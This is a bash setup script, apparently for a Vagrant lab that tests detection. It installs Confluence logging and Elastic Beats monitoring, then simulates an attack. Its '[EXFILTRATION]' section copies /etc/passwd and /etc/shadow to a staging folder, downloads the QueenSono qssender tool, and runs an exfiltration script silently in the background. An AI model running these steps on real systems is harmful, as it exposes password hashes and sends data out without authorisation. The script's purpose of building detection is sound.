
#!/bin/bash

# Start Confluence
/etc/init.d/confluence start

# General
apt install rsyslog
service rsyslog start

# [BEATS SETUP]
# Setup packetbeat
apt-get install libpcap0.8 -y
curl -L -O https://artifacts.elastic.co/downloads/beats/packetbeat/packetbeat-8.3.3-amd64.deb
dpkg -i packetbeat-8.3.3-amd64.deb
cp /vagrant/config/packetbeat/packetbeat.yml /etc/packetbeat/packetbeat.yml

# Setup filebeat
curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.3.3-amd64.deb
dpkg -i filebeat-8.3.3-amd64.deb
filebeat modules enable system
cp /vagrant/config/filebeat/filebeat.yml /etc/filebeat/filebeat.yml
cp /vagrant/config/filebeat/system.yml /etc/filebeat/modules.d/system.yml
cp /vagrant/config/filebeat/50-default.conf /etc/rsyslog.d/50-default.conf

# Seup auditbeat
curl -L -O https://artifacts.elastic.co/downloads/beats/auditbeat/auditbeat-8.3.3-amd64.deb
dpkg -i auditbeat-8.3.3-amd64.deb
cp /vagrant/config/auditbeat/auditbeat.yml /etc/auditbeat/auditbeat.yml


#[EXFILTRATION]

#Simulate collected files
mkdir /tmp/exfiltrate
cat /etc/passwd > /tmp/exfiltrate/passwd
cat /etc/shadow > /tmp/exfiltrate/shadow
# Setup qsreceiver and qssender
wget https://github.com/ariary/QueenSono/releases/latest/download/qssender -O /tmp/qssender
chmod +x /tmp/qssender
cp /vagrant/attack/exfiltration/run_qssender.sh /tmp/run_qssender.sh
chmod +x /tmp/run_qssender.sh
nohup /tmp/run_qssender.sh &>/dev/null &

# Start beats
filebeat setup -e
packetbeat setup -e
auditbeat setup -e
service filebeat start
service packetbeat start
service auditbeat start
